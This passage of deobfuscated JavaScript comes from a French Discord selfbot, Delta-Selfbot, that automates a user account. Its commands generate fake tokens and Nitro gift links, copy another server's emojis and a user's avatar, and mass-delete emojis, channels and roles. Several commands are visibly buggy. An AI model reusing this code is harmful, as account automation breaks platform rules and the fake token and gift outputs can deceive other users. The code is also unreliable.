            console.log('Commande delete all role effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'punch')) {
            if (!_0x18f2x3b.author) {
                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
                return;
            }
            let _0x18f2x84 = new Discord.RichEmbed();
            _0x18f2x84.setColor(color)
                .setTitle('**' + client.user.username + ' punch ' + _0x18f2x3e.username + '**')
                .setTimestamp()
                .setFooter('Delta-Selfbot')
                .setImage(punch[Math.floor(Math.random() * punch.length)]);
            _0x18f2x3b.edit(_0x18f2x84)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande punch effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'calin')) {
            if (!_0x18f2x3b.author) {
                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
                return;
            }
            let _0x18f2x85 = new Discord.RichEmbed();
            _0x18f2x85.setColor(color)
                .setTitle('**' + client.user.username + ' fait un calin a ' + _0x18f2x3e.username + '**')
                .setTimestamp()
                .setFooter('Delta-Selfbot')
                .setImage(hugh[Math.floor(Math.random() * hugh.length)]);
            _0x18f2x3b.edit(_0x18f2x85)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande calin effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'set serveur name')) {
            let _0x18f2x86 = _0x18f2x3d.splice(1)
                .join(' ') || 'Delta selfbot';
            _0x18f2x3b.edit('Changement du nom du serveur pour: ' + (_0x18f2x3d.splice(1)
                .join(' ') || 'Delta selfbot'));
            _0x18f2x3b.guild.setName(_0x18f2x86);
            console.log('Commande set serveur name effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith('' + prefix + 'token')) {
            if (!_0x18f2x3b.author) {
                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur!**');
                return;
            }
            let token = [
                'HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'
            ];
            let _0x18f2x87 = [
                'a6uny9jcMjet2W2LASruribq6VI', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', '3_6Xt2k4OieDKimnNYGWUq9vJRo', 'xllelHltGdY7DP_0s1XST4cgzTs'
            ];
            var _0x18f2x53 = _0x18f2x3e.id;
            var _0x18f2x88 = utf8.encode(_0x18f2x53);
            var _0x18f2x89 = base64.encode(_0x18f2x88);
            let _0x18f2x8a = new Discord.RichEmbed()
                .setColor('' + color + '')
                .setFooter('Delta-Selfbot')
                .setTitle('Token match ' + _0x18f2x3e.username + '')
                .setDescription('' + base64.encode(_0x18f2x88) + '.' + token[Math.floor(Math.random() * [
                    'HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'
                ].length)] + '.' + _0x18f2x87[Math.floor(Math.random() * [
                    'a6uny9jcMjet2W2LASruribq6VI', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', '3_6Xt2k4OieDKimnNYGWUq9vJRo', 'xllelHltGdY7DP_0s1XST4cgzTs'
                ].length)] + '');
            setTimeout(() =>

                {
                    _0x18f2x3b.edit('░░░░░░░░░░ 0%');
                }, 1000);
            setTimeout(() =>

                {
                    _0x18f2x3b.edit('▓▓░░░░░░░░ 20%');
                }, 1500);
            setTimeout(() =>

                {
                    _0x18f2x3b.edit('▓▓▓▓░░░░░░ 40%');
                }, 2000);
            setTimeout(() =>

                {
                    _0x18f2x3b.edit('▓▓▓▓▓▓░░░░ 60%');
                }, 2500);
            setTimeout(() =>

                {
                    _0x18f2x3b.edit('▓▓▓▓▓▓▓▓░░ 80%');
                }, 3000);
            setTimeout(() =>

                {
                    _0x18f2x3b.edit('▓▓▓▓▓▓▓▓▓▓ 100%');
                }, 3500);
            setTimeout(() =>

                {
                    _0x18f2x3b.edit(_0x18f2x8a)
                        .catch(_0x18f2x44 =>

                            {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                }, 4000);
            console.log('Commande token effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith('' + prefix + 'encode')) {
            var _0x18f2x8b = _0x18f2x3d.join(' ') || 'Delta selfbot';;
            var _0x18f2x88 = utf8.encode(_0x18f2x8b);
            var _0x18f2x89 = base64.encode(_0x18f2x88);
            let _0x18f2x8a = new Discord.RichEmbed()
                .setColor('' + color + '')
                .setTitle('Texte -> Base64 :')
                .setDescription(_0x18f2x89);
            _0x18f2x3b.edit(_0x18f2x8a)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande encode effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith('' + prefix + 'lovecalc')) {
            let _0x18f2x8c = [
                '5%', '10%', '15%', '20%', '25%', '30%', '35%', '40%', '45%', '50%', '55', '60%', '65%', '70%', '75%', '80%', '85%', '90%', '95%', '100%'
            ];
            let _0x18f2x8d = Math.floor(Math.random() * _0x18f2x8c.length);
            let _0x18f2x8e = _0x18f2x3d.slice(0)
                .join(' ') || 'Delta selfbot';;
            let _0x18f2x12 = new Discord.RichEmbed()
                .setAuthor(_0x18f2x3b.author.tag)
                .setColor('ORANGE')
                .setFooter('Delta-Selfbot')
                .setThumbnail('' + _0x18f2x3b.author.avatarURL + '')
                .addField('calcul de relation plausible ❤', _0x18f2x8e)
                .addField('relation estimée à ❤', _0x18f2x8c[_0x18f2x8d]);
            _0x18f2x3b.edit(_0x18f2x12)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande lovecalc effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'spotify')) {
            const _0x18f2x7a = _0x18f2x3b.content.split(' ')
                .slice(1)
                .join(' ') || 'Delta Selfbot';
            let _0x18f2x30 = rpcGenerator.createSpotifyRpc(client)
                .setAssetsLargeImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')
                .setAssetsSmallImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')
                .setDetails(_0x18f2x7a)
                .setState('Delta-Selfbot')
                .setStartTimestamp(Date.now())
                .setEndTimestamp(Date.now() + 86400000);
            client.user.setPresence(_0x18f2x30.toDiscord())
                .then(_0x18f2x3b.edit(':white_check_mark: **Tu écoutes ' + (_0x18f2x3b.content.split(' ')
                    .slice(1)
                    .join(' ') || 'Delta Selfbot') + ' sur spotify**'))
                .catch(console.error);
            console.log('Commande spotify effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith('' + prefix + 'reset')) {
            clearInterval();
            client.user.setActivity(null, {});
            _0x18f2x3b.edit(':information_source:  Votre statut a été réinitialisé ! :information_source:')
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande reset effectué'.yellow);
        }
        if (_0x18f2x3b.content === '' + prefix + 'nitro') {
            const _0x18f2x8f = new Discord.RichEmbed()
                .setColor(color)
                .setThumbnail('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
                .addField('Gift :', '|| https://discord.gift/' + nitrocode(16, '0aA') + ' ||');
            _0x18f2x3b.edit(_0x18f2x8f)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande nitro generator effectué'.yellow);
        }
        if (_0x18f2x3c.content.startsWith(prefix + 'gen token')) {
            _0x18f2x3c.delete();
            setTimeout(() =>

                {
                    client.destroy()
                        .catch(_0x18f2x44 =>

                            {
                                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                            });
                }, 1500);
            console.log('Nouveau token generé'.green);
        }
        if (_0x18f2x3c.content.startsWith(prefix + 'reverse')) {
            let _0x18f2x90 = _0x18f2x3d.splice(1)
                .join(' ');
            if (!_0x18f2x3d.splice(1)
                .join(' ')) {
                _0x18f2x3b.edit(':x: **Pas de test definit**');
            }

            function _0x18f2x91(_0x18f2x92)

            {
                return _0x18f2x92['split']('')['reverse']()['join']('');
            }
            let _0x18f2x93 = _0x18f2x91(_0x18f2x90);
            if (_0x18f2x3d[0] === _0x18f2x93) {
                _0x18f2x93 = '' + _0x18f2x3d.splice(1)
                    .join(' ') + '';
            }
            _0x18f2x3c.edit('' + ('' + _0x18f2x3d.splice(1)
                    .join(' ') + '') + '')
                .catch(console.error);
            console.log('Commande reverse effectué'.yellow);
        }
        if (_0x18f2x3c.content.startsWith(prefix + 'discord')) {
            let _0x18f2x94 = new Discord.RichEmbed()
                .setColor(color)
                .setDescription('Discord Version : **' + Discord.version + '**')
                .setFooter('Delta-Selfbot');
            _0x18f2x3c.edit(_0x18f2x94)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                    });
            console.log('Commande discord effectué'.yellow);
        }
        if (_0x18f2x3b.content === prefix + 'restart') {
            _0x18f2x3b.edit('**redémarrage** du self bot...')
                .then(client.destroy())
                .then(() =>

                    {
                        return client['login'](token);
                    });
            console.log('Commande restart effectué'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'role info' || prefix + 'ri')) {
            let _0x18f2x78 = _0x18f2x3b.guild;
            let _0x18f2x95 = _0x18f2x3b.mentions.roles.first();
            if (!_0x18f2x3b.guild) {
                return _0x18f2x3c['edit'](':x: **Commande uniquement utilisable sur un serveur**');
            }
            if (!_0x18f2x3b.mentions.roles.first()) {
                return _0x18f2x3b['delete']()['then'](console['log']('[', 'ERROR' ['red'], ']', 'un nom de rôle est nécessaire' ['green']));
            }
            const _0x18f2x6a = {
                false: 'Non',
                true: 'oui'
            };
            let _0x18f2x96 = new Discord.RichEmbed()
                .setColor(color)
                .setDescription('<@&' + _0x18f2x95.id + '>')
                .addField('id du role:', _0x18f2x95.id)
                .addField('couleur:', _0x18f2x95.hexColor)
                .setFooter('Delta-Selfbot')
                .addField('nombre de membres ayant ce role:', _0x18f2x95.members.size)
                .addField('position:', _0x18f2x95.position)
                .addField('mentionnable:', _0x18f2x6a[_0x18f2x95.mentionable]);
            if (!_0x18f2x3b.member.hasPermission('EMBED_LINKS')) {
                return _0x18f2x3b['edit'](`${ ':x: **permission insuffisante (embed_links)**\\n<@&' }${ _0x18f2x95['id'] }${ '>\\n\\nid du role: ' }${ _0x18f2x95['id'] }${ '\\ncouleur du role: ' }${ _0x18f2x95['hexColor'] }${ '\\nmembres ayant ce role: ' }${ _0x18f2x95['members']['size'] }${ '\\nposition: ' }${ _0x18f2x95['position'] }${ '\\nmentionnable: ' }${ _0x18f2x6a[_0x18f2x95['mentionable']] }${ '' }`);
            }
            console.log('Commande role info effectué'.yellow);
            _0x18f2x3b.edit(_0x18f2x96)
                .catch(_0x18f2x44 =>

                    {
                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler');
                    });
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'add emote')) {
            if (_0x18f2x3b.channel.type === 'dm') {
                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
                return;
            }
            let _0x18f2x86 = _0x18f2x3d.splice(2)
                .join(' ');
            let _0x18f2x97 = Discord.Util.parseEmoji(_0x18f2x86);
            if (!_0x18f2x3b.content.split(' ')
                .splice(1)
                .join(' ')) {
                _0x18f2x3b.edit(':x: **Veuillez choisir une emote.**');
                return;
            }
            if (!Discord.Util.parseEmoji(_0x18f2x86)) {
                _0x18f2x3b.edit(':x: **Emote invalide essayez ceci** ' + prefix + 'add emote (emote) <name>');
                return;
            }
            if (!_0x18f2x3b.member.hasPermission('MANAGE_EMOJIS')) {
                _0x18f2x3b.edit(':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
                return;
            }
            if (_0x18f2x97.id) {
                const _0x18f2x98 = 'https://cdn.discordapp.com/emojis/' + _0x18f2x97.id + '.' + (_0x18f2x97.animated ? 'gif' : 'png') + '';
                let _0x18f2x99 = _0x18f2x3b.content.split(' ')
                    .splice(3) || _0x18f2x97.name;
                _0x18f2x3b.guild.createEmoji('' + ('https://cdn.discordapp.com/emojis/' + _0x18f2x97.id + '.' + (_0x18f2x97.animated ? 'gif' : 'png') + '') + '', '' + (_0x18f2x3b.content.split(' ')
                    .splice(3) || _0x18f2x97.name) + '');
                _0x18f2x3b.edit(':white_check_mark: **Emote ajoutée au serveur.**');
                console.log('Commande add emote executé.'.yellow);
            } else {
                _0x18f2x3b.edit(':x: **Veuillez choisir une emote valide!**');
            }
        }
        if (_0x18f2x3b.content === prefix + 'emote') {
            if (_0x18f2x3b.channel.type === 'dm') {
                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
                return;
            }
            let _0x18f2x9a = '';
            let _0x18f2x9b = '';
            let _0x18f2x9c = 0;
            let _0x18f2x9d = 0;
            let _0x18f2x9e = 0;

            function _0x18f2x9f(_0x18f2x53)

            {
                return client['emojis']['get'](_0x18f2x53)
                    .toString();
            }
            _0x18f2x3b.guild.emojis.forEach(_0x18f2xa0 =>

                {
                    0;
                    if (_0x18f2xa0.animated) {
                        0;
                        _0x18f2x9b = '' + _0x18f2x9f(_0x18f2xa0.id);
                    } else {
                        0;
                        _0x18f2x9a = '' + _0x18f2x9f(_0x18f2xa0.id);
                    }
                });
            let _0x18f2x12 = new Discord.RichEmbed()
                .setTitle('Emojis dans: **' + _0x18f2x3b.guild.name + '**')
                .setFooter('Delta-Selfbot')
                .setColor(color)
                .addField('Emojis animés: [1]', '' || 'None')
                .addField('Emojis [1]', '' || 'None')
                .addField('Total d\'emojis', 1 || 'None');
            _0x18f2x3b.edit(_0x18f2x12);
            console.log('Commande emote executé.'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'remove emote')) {
            if (_0x18f2x3b.channel.type === 'dm') {
                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
                return;
            }
            if (!_0x18f2x3b.member.hasPermission('MANAGE_EMOJIS')) {
                return _0x18f2x3b['edit'](':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
            }
            const _0x18f2xa0 = _0x18f2x3d.splice(2)
                .join(' ');
            if (!_0x18f2x3d.splice(2)
                .join(' ')) {
                return _0x18f2x3b['edit'](`${ ':x: **Veuillez choisir une emote.**' }`);
            }
            let _0x18f2x97 = Discord.Util.parseEmoji(_0x18f2xa0);
            if (!_0x18f2x3b.guild.emojis.forEach(_0x18f2xa1 =>

                    {
                        if (!_0x18f2xa1.id === _0x18f2x97.id) {
                            return _0x18f2x3b['channel']['send'](`${ ':x: **Cette emote n\'est pas sur le serveur**.' }`);
                        }
                    })) {
                return _0x18f2x3b['edit'](':white_check_mark: **Emote correctement supprimée du serveur.**');
            }
            if (_0x18f2x97.id) {
                const _0x18f2x98 = 'https://cdn.discordapp.com/emojis/' + _0x18f2x97.id + '.' + (_0x18f2x97.animated ? 'gif' : 'png') + '';
                _0x18f2x3b.guild.emojis.get(_0x18f2x97.id)
                    .delete();
            } else {
                let _0x18f2xa2 = parse(_0x18f2xa0, {
                    assetType: 'png'
                });
                if (!_0x18f2xa2[0]) {
                    return _0x18f2x3b['edit'](`${ ':x: **Veuillez choisir une emote valide**!' }`);
                }
                _0x18f2x3b.edit(':x: **Vous ne pouvez pas supprimer les emotes par defaut**!');
            };
            console.log('Commande remove emote executé.'.yellow);
        }
        if (_0x18f2x3b.content.startsWith(prefix + 'steal emote')) {
            if (_0x18f2x3b.channel.type === 'dm') {
                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
                return;
            }
            let _0x18f2x86 = _0x18f2x3d.splice(2)
                .join(' ');
            let _0x18f2xa3 = client.guilds.get(_0x18f2x86);
            if (!client.guilds.get(_0x18f2x86)) {
                _0x18f2x3b.edit(':x: **Aucun serveur trouvable avec l\'id** "' + _0x18f2x3d.splice(2)
                    .join(' ') + '"');
                return;
            }
            if (!_0x18f2x3b.member.hasPermission('MANAGE_EMOJIS')) {
                return _0x18f2x3b['edit'](':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**');
            }
            if (_0x18f2xa3.emojis.size < 1) {
                _0x18f2x3b.edit(':x: **Le serveur ne contient aucun emote.**');
            }
            let i = '1';
            _0x18f2xa3.emojis.forEach(_0x18f2xa1 =>

                {
                    setTimeout(() =>

                        {
                            let _0x18f2x99 = _0x18f2xa1.name;
                            const _0x18f2x98 = 'https://cdn.discordapp.com/emojis/' + _0x18f2xa1.id + '.' + (_0x18f2xa1.animated ? 'gif' : 'png') + '';
                            _0x18f2x3b.guild.createEmoji('' + ('https://cdn.discordapp.com/emojis/' + _0x18f2xa1.id + '.' + (_0x18f2xa1.animated ? 'gif' : 'png') + '') + '', '' + _0x18f2xa1.name + '')
                                .catch(_0x18f2x44 =>

                                    {
                                        return '11';
                                    });
                        }, 1000);
                });
            console.log('Commande steal emote executé.'.yellow);
            _0x18f2x3b.edit(':white_check_mark: **J\'ai volé les emotes du serveur** "' + _0x18f2xa3.name + '"');
        }
        if (_0x18f2x3b.content === prefix + 'delete all emote') {
            if (_0x18f2x3b.channel.type === 'dm') {
                _0x18f2x3b.edit(':x: **Commande pas executable en mp**');
                return;
            }
            if (_0x18f2x3b.guild.emojis.size < 1) {
                _0x18f2x3b.edit(':x: **Il n\' y a aucun emote a supprimer.**');
                return;
            }
            _0x18f2x3b.guild.emojis.forEach(_0x18f2xa1 =>

                {
                    _0x18f2x3b.guild.emojis.get(_0x18f2xa1.id)
                        .delete();
                });
        };
        if (_0x18f2x3b.content.startsWith(prefix + 'grab pp')) {
            let _0x18f2xa4 = _0x18f2x3b.mentions.users.first();
            let _0x18f2xa5 = _0x18f2xa4.avatarURL;
            if (!_0x18f2x3b.mentions.users.first()) {
                _0x18f2x3b.edit(':x: **Veuillez mentionner un utilisateur valide!**');
                return;
            };
            if (!_0x18f2xa4.avatarURL) {
                _0x18f2x3b.edi(':x: **Cet utilisateur n\'a pas d\'avatar!**');
                return;
            };
            client.user.setAvatar(_0x18f2xa5);
            console.log('Commande grab pp executé.'.yellow);
            _0x18f2x3b.edit(':white_check_mark: **J\'ai correctement volé la photo de profile de ** "' + _0x18f2xa4.username + '"');
        };
            let _0x18f2xa6 = client.emojis.get('655091815401127966') || 'ℹ️';
            let _0x18f2xa7 = client.emojis.get('655695570769412096') || '⌛';
            let _0x18f2xa8 = client.emojis.get('655696285286006784') || '✅';
            let _0x18f2x44 = client.emojis.get('655704809483141141') || '❌';
            let _0x18f2xa9 = client.emojis.get('656030540310380574') || '⚠️';
            if (_0x18f2x3c.content === prefix + 'backup create' | _0x18f2x3c.content == prefix + 'backup c') {
                let _0x18f2x78 = _0x18f2x3b.guild;
                if (!_0x18f2x3b.guild) {
                    _0x18f2x3b.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                _0x18f2x3b.guild.roles.filter(_0x18f2x45 =>

                        {
                            return _0x18f2x45['name'] !== _0x18f2x3b['guild']['member'](client['user']['id'])['highestRole']['name'];
                        })
                    .forEach(_0x18f2x45 =>

                        {
                            if (_0x18f2x45.comparePositionTo(_0x18f2x3b.guild.member(client.user.id)
                                    .highestRole) > 0) {
                                return _0x18f2x3b['edit'](`${ '' }${ _0x18f2xa9 }${ '  **Attention**\\n\\nMon role n\'est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup\\n\\nDelta-Selfbot' }`)['catch'](_0x18f2x44 => {
                                    return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
                                });
                            }
                        });
                _0x18f2x3b.edit('' + (client.emojis.get('655695570769412096') || '⌛') + '  **Please wait** ...\\n\\nCréation de la backup. Attendre la finalisation...\\n\\nDeltea-Selfbot')
                    .catch(_0x18f2x44 =>

                        {
                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                        })
                    .then(_0x18f2x6d =>

                        {
                            let _0x18f2x53 = _0x18f2xba(16);
                            const _0x18f2x82 = _0x18f2x3b.guild.channels.sort(function(_0x18f2x14, _0x18f2x15)

                                    {
                                        return _0x18f2x14.position - _0x18f2x15.position;
                                    })
                                .array()
                                .map(_0x18f2x41 =>

                                    {
                                        const _0x18f2x43 = {
                                            type: _0x18f2x41.type,
                                            name: _0x18f2x41.name,
                                            postion: _0x18f2x41.calculatedPosition
                                        };
                                        if (_0x18f2x41.parent) {
                                            _0x18f2x43.parent = _0x18f2x41.parent.name;
                                        }
                                        return _0x18f2x43;
                                    });
                            const _0x18f2x47 = _0x18f2x3b.guild.roles.filter(_0x18f2x45 =>

                                    {
                                        return _0x18f2x45.name !== '@everyone';
                                    })
                                .sort(function(_0x18f2x14, _0x18f2x15)

                                    {
                                        return _0x18f2x14.position - _0x18f2x15.position;
                                    })
                                .array()
                                .map(_0x18f2x45 =>

                                    {
                                        const _0x18f2x46 = {
                                            name: _0x18f2x45.name,
                                            color: _0x18f2x45.color,
                                            hoist: _0x18f2x45.hoist,
                                            permissions: _0x18f2x45.permissions,
                                            mentionable: _0x18f2x45.mentionable,
                                            position: _0x18f2x45.position
                                        };
                                        return _0x18f2x46;
                                    });
                            if (!backups[_0x18f2x3b.author.id]) {
                                backups[_0x18f2x3b.author.id] = {};
                            }
                            backups[_0x18f2x3b.author.id][_0x18f2x53] = {
                                icon: _0x18f2x3b.guild.iconURL,
                                name: _0x18f2x3b.guild.name,
                                owner: _0x18f2x3b.guild.ownerID,
                                members: _0x18f2x3b.guild.memberCount,
                                createdAt: _0x18f2x3b.guild.createdAt,
                                roles: roles,
                                channels: channels
                            };
                            _0x18f2xbe();
                            console.log(('Nouvelle backup du serveur ' + _0x18f2x3b.guild.name + ' vien d\'être crée, voici son id : ' + _0x18f2xba(16) + '')
                                .green);
                            _0x18f2x3b.edit('' + (client.emojis.get('655091815401127966') || 'ℹ️') + '  **Info**\\n\\nNouvelle backup du serveur **' + _0x18f2x3b.guild.name + '** vien d\'être crée, voici son id : \\`' + _0x18f2xba(16) + '\\`\\n**' + prefix + 'backup load (id)** Pour load la backup\\n\\nDelta-Selfbot')
                                .catch(_0x18f2x44 =>

                                    {
                                        return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                                    });
                        });
                console.log('Commande create backup executé'.yellow);
            }
            if (_0x18f2x3c.content.startsWith(prefix + 'backup delete')) {
                let _0x18f2x78 = _0x18f2x3b.guild;
                if (!_0x18f2x3b.guild) {
                    _0x18f2x3b.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                    return;
                }
                let _0x18f2xaa = _0x18f2x3d.splice(2)
                    .join(' ');
                let _0x18f2xab = new Discord.RichEmbed()
                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + ' Erreur')
                    .setFooter('Delta-Selfbot')
                    .setDescription('Tu dois définir ton id de backup... Fais ' + prefix + 'help pour avoir plus d\'informations.')
                    .setColor(color);
                if (!_0x18f2x3d.splice(2)
                    .join(' ')) {
                    return _0x18f2x3b['edit'](_0x18f2xab)['catch'](_0x18f2x44 => {
                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
                    });
                }
                let _0x18f2xac = new Discord.RichEmbed()
                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
                    .setFooter('Delta-Selfbot')
                    .addField('**Tu n\'a pas de backup avec cette id : ' + _0x18f2x3d.splice(2)
                        .join(' ') + '.**', prefix + 'help pour plus d\'informations')
                    .setColor(color);
                if (!backups[_0x18f2x3b.author.id][_0x18f2xaa]) {
                    return _0x18f2x3b['edit'](_0x18f2xac)['catch'](_0x18f2x44 => {
                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
                    });
                };
                delete backups[_0x18f2x3b.author.id][_0x18f2xaa];
                _0x18f2xbe();
                let _0x18f2xad = new Discord.RichEmbed()
                    .setTitle('' + (client.emojis.get('655696285286006784') || '✅') + '  Succès !')
                    .setFooter('Delta-Selfbot')
                    .setDescription('La **backup** a bien été supprimée.')
                    .setColor(color);
                _0x18f2x3b.edit(_0x18f2xad)
                    .catch(_0x18f2x44 =>

                        {
                            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
                        });
                console.log('Commande delete backup executé'.yellow);
            }
            if (_0x18f2x3c.content.startsWith(prefix + 'backup load') || _0x18f2x3c.content.startsWith(prefix + 'backup l')) {
                let _0x18f2x78 = _0x18f2x3b.guild;
                if (!_0x18f2x3b.guild) {
                    _0x18f2x3b.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                    return;
                }
                let _0x18f2x44 = client.emojis.get('655704809483141141') || '❌';
                let _0x18f2xaa = _0x18f2x3d.splice(2)
                    .join(' ');
                let _0x18f2xab = new Discord.RichEmbed()
                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
                    .setDescription('Tu as oublié de définir une **id de backup**. Utilise la commande \\`' + prefix + 'help\\` pour avoir plus d\'informations');
                if (!_0x18f2x3d.splice(2)
                    .join(' ')) {
                    return _0x18f2x3b['channel']['send'](_0x18f2xab);
                }
                let _0x18f2xac = new Discord.RichEmbed()
                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
                    .addField('**Aucune backup avec l\'id ' + _0x18f2x3d.splice(2)
                        .join(' ') + '.**', '/help pour plus d\'information')
                    .setFooter('Delta-Selfbot')
                    .setColor(color);
                if (!backups[_0x18f2x3b.author.id][_0x18f2xaa]) {
                    return _0x18f2x3b['channel']['send'](_0x18f2xac)['catch'](_0x18f2x44 => {
                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
                    });
                }
                _0x18f2x3b.guild.channels.forEach(_0x18f2x43 =>

                    {
                        _0x18f2x43.delete('For Loading A Backup');
                    });
                _0x18f2x3b.guild.roles.filter(_0x18f2x46 =>

                        {
                            return _0x18f2x46.members.every(_0x18f2x79 =>

                                {
                                    return !_0x18f2x79.user.bot;
                                });
                        })
                    .forEach(_0x18f2x46 =>

                        {
                            _0x18f2x46.delete('For Loading A Backup');
                        });
                backups[_0x18f2x3b.author.id][_0x18f2xaa].roles.forEach(function(_0x18f2x46)

                    {
                        _0x18f2x3b.guild.createRole({
                                name: _0x18f2x46.name,
                                color: _0x18f2x46.color,
                                permissions: _0x18f2x46.permissions,
                                hoist: _0x18f2x46.hoist,
                                mentionable: _0x18f2x46.mentionable,
                                position: _0x18f2x46.position
                            })
                            .then(_0x18f2x46 =>

                                {
                                    _0x18f2x46.setPosition(_0x18f2x46.position);
                                });
                    });
                backups[_0x18f2x3b.author.id][_0x18f2xaa].channels.filter(_0x18f2x41 =>

                        {
                            return _0x18f2x41.type === 'category';
                        })
                    .forEach(function(_0x18f2xae)

                        {
                            _0x18f2x3b.guild.createChannel(_0x18f2xae.name, {
                                type: _0x18f2xae.type,
                                permissionOverwrites: _0x18f2xae.permissionOverwrites
                            });
                        });
                backups[_0x18f2x3b.author.id][_0x18f2xaa].channels.filter(_0x18f2x41 =>

                        {
                            return _0x18f2x41.type !== 'category';
                        })
                    .forEach(function(_0x18f2xae)

                        {
                            _0x18f2x3b.guild.createChannel(_0x18f2xae.name, {
                                    type: _0x18f2xae.type,
                                    permissionOverwrites: _0x18f2xae.permissionOverwrites
                                })
                                .then(_0x18f2x41 =>

                                    {
                                        const _0x18f2xaf = _0x18f2x3b.guild.channels.filter(_0x18f2x41 =>

                                                {
                                                    return _0x18f2x41.type === 'category';
                                                })
                                            .find(_0x18f2x41 =>

                                                {
                                                    return _0x18f2x41['name'] === _0x18f2xae['parent'];
                                                });
                                        if (_0x18f2xae.parent)
                                            (_0x18f2x41.setParent(_0x18f2xaf))
                                        else
                                            '';
                                    });
                        });
                _0x18f2x3b.guild.setName(backups[_0x18f2x3b.author.id][_0x18f2xaa].name);
                _0x18f2x3b.guild.setIcon(backups[_0x18f2x3b.author.id][_0x18f2xaa].icon);
                console.log('Commande load backup executé'.yellow);
            }
            if (_0x18f2x3c.content.startsWith(prefix + 'backup info') || _0x18f2x3c.content.startsWith(prefix + 'backup i')) {
                let _0x18f2x53 = _0x18f2x3d.splice(2)
                    .join(' ');
                let _0x18f2xb0 = new Discord.RichEmbed()
                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
                    .setFooter('Delta-Selfbot')
                    .setDescription('Tu as oublié de définir une **id de backup**. Utilise la commande \\`' + prefix + 'help\\` pour avoir plus d\'informations')
                    .setColor(color);
                if (!_0x18f2x3d.splice(2)
                    .join(' ')) {
                    return _0x18f2x3b['edit'](_0x18f2xb0)['catch'](_0x18f2x44 => {
                        return console['log']('[', 'ERROR' ['red'], ']', 'une erreur est survenue que je ne peux régler' ['green']);
                    });
                }
                let _0x18f2xb1 = new Discord.RichEmbed()
                    .setTitle('' + (client.emojis.get('655704809483141141') || '❌') + '  Error')
                    .setFooter('Delta-Selfbot')
                    .setDescription('Tu n\'as pas de **backup** avec cet id \\`' + _0x18f2x3d.splice(2)
                        .join(' ') + '\\`.')
                    .setColor(color);
                if (!backups[_0x18f2x3b.author.id][_0x18f2x53]) {
                    return _0x18f2x3b['edit'](_0x18f2xb1);
                }
                    let _0x18f2xb2 = new Discord.RichEmbed()
                        .setTitle(backups[_0x18f2x3b.author.id][_0x18f2x53].name)
                        .setThumbnail(backups[_0x18f2x3b.author.id][_0x18f2x53].icon)
